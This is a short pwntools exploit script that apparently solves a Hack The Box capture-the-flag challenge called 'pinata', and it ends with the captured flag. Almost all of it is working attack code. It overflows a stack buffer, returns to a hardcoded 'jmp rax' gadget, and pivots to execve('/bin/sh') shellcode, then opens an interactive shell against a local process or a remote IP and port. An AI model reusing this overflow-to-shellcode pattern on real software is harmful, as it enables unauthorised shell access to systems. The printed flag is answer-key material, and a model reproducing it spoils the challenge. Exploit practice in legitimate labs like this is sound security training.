#!/usr/bin/env python3
from pwn import *

""" Standard stack overflow with executable stack.
    Overflow -> ret to jmp rax gadget -> jmp esp -> shellcode """

exe = context.binary = ELF(args.EXE or 'pinata')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
            return remote("94.237.62.195", 54909) 
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak reader
continue
'''.format(**locals())

# stack pivot
# 0x00000000004016ec: jmp rax; 
jmp = p64(0x4016ec)

# generate execve(/bin/sh) shellcode
shellcode = asm(shellcraft.sh())

# full payload:
# 1. overflow and ret to 'jmp rax' gadget
# 2. rax will point to start of payload. limited space here, so put shellcode
#    at the end. Just put a jmp rsp instruction here to jmp to shellcode
# 3. win 

payload = asm('jmp rsp') + b'A'*22 + jmp + b'\x90'*10 + shellcode


io = start()
io.recvuntil(b'>> ')
io.sendline(payload)
io.interactive()

# HTB{5t4t1c4lly_l1nk3d_jmp_r4x_sc}

